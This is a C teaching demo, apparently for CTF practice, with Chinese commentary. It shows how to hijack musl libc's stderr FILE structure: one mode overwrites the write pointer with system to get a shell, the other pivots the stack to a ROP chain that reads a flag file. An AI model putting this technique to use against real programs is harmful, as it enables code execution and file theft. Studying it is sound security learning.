#include "musl.h"

#define shell 1
#define orw 2
#define mode orw

char* flag = "./flag";
char* bin_sh = "/bin/sh";
size_t enough_space[0x100];
size_t fake_stack[0x40];
char flag_content[0x20];

int main(){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    size_t stderr_addr = (size_t)stderr;
    size_t libc_base = stderr_addr - 0x99120;
    printf_color(GREEN, UNDEFINED, "计算得到libc的基地址为：");
    printf("\033[1;31m%#zx\n\n\033[0m", libc_base);

    if(mode == shell){
        printf_color(BLUE, HIGHLIGHT, "你选择了get shell模式。\n");
        printf_color(GREEN, UNDEFINED, "在get shell模式中，我们需要修改stderr的3处内容：\n");
        printf_color(RED, HIGHLIGHT, "1. 开头，需修改为字符串\"/bin/sh\"。\n");
        printf_color(RED, HIGHLIGHT, "2. wpos或wbase，使得这两个值不等即可。\n");
        printf_color(RED, HIGHLIGHT, "3. write函数指针，修改为system的地址。\n");

        printf_color(GREEN, UNDEFINED, "需要注意调用write函数时，第一个参数是FILE结构体地址。\n");
        printf_color(GREEN, UNDEFINED, "因此需要在FILE开头写字符串，从而get shell。\n");

        size_t system_addr = (size_t)system;
        printf_color(GREEN, UNDEFINED, "system的地址为：");
        printf("\033[1;31m%#zx\n\033[0m", system_addr);
        strcpy((char*)stderr_addr, "/bin/sh");
        ((FILE*)stderr_addr)->wbase = (unsigned char*)1;
        ((FILE*)stderr_addr)->write = (size_t (*)(FILE*, const unsigned char*, size_t))system_addr;

        exit(0);
    }else if(mode == orw){
        printf_color(BLUE, HIGHLIGHT, "你选择了orw模式。\n");
        printf_color(GREEN, UNDEFINED, "orw的利用方式较get shell要复杂一些。\n");
        printf_color(GREEN, UNDEFINED, "但对于stderr而言还是只需要修改3个地方：\n");
        printf_color(RED, HIGHLIGHT, "1. 偏移0x30处，修改为修改为新栈的地址。\n");
        printf_color(RED, HIGHLIGHT, "2. wbase，偏移0x38，修改为第一个gadget的地址。\n");
        printf_color(RED, HIGHLIGHT, "3. write函数指针，修改为栈迁移的gadget的地址。\n\n");

        printf_color(GREEN, UNDEFINED, "在偏移0x4BCF3处有这样一个gadget：\n");
        printf_color(RED, HIGHLIGHT, "0x000000000004BCF3 : mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]\n");
        printf_color(GREEN, UNDEFINED, "考虑到write函数调用的第一个参数为stderr地址，rdi=stderr地址。\n");
        printf_color(GREEN, UNDEFINED, "按照上面的方案修改stderr，可以完美实现栈迁移。\n");

        printf_color(GREEN, UNDEFINED, "准备伪造栈的地址为：");
        printf("\033[1;31m%p\n\033[0m", fake_stack);

        size_t pivot_gadget = libc_base + 0x4BCF3;
        size_t pop_rdi = libc_base + 0x15536;
        size_t pop_rsi = libc_base + 0x1B3A9;
        size_t pop_rdx = libc_base + 0x177C7;

        ((FILE*)stderr_addr)->mustbezero_1 = (unsigned char*)fake_stack;
        ((FILE*)stderr_addr)->wbase = (unsigned char*)pop_rdi;
        ((FILE*)stderr_addr)->write = (size_t (*)(FILE*, const unsigned char*, size_t))pivot_gadget;

        fake_stack[0] = (size_t)flag;   // open函数参数1
        fake_stack[1] = pop_rsi;
        fake_stack[2] = 0;              // open函数参数2
        fake_stack[3] = (size_t)open;   // 调用open
        fake_stack[4] = pop_rdi;
        fake_stack[5] = 3;              // read函数参数1
        fake_stack[6] = pop_rsi;
        fake_stack[7] = (size_t) flag_content;  // read函数参数2
        fake_stack[8] = (size_t) pop_rdx;
        fake_stack[9] = 0x20;           // read函数参数3
        fake_stack[10] = (size_t)read;  // 调用open
        fake_stack[11] = pop_rdi;
        fake_stack[12] = 1;             // write函数参数1
        fake_stack[13] = pop_rsi;
        fake_stack[14] = (size_t) flag_content;  // write函数参数2
        fake_stack[15] = (size_t) pop_rdx;
        fake_stack[16] = 0x20;          // write函数参数3
        fake_stack[17] = (size_t)write; // 调用write

        exit(0);
    }
}

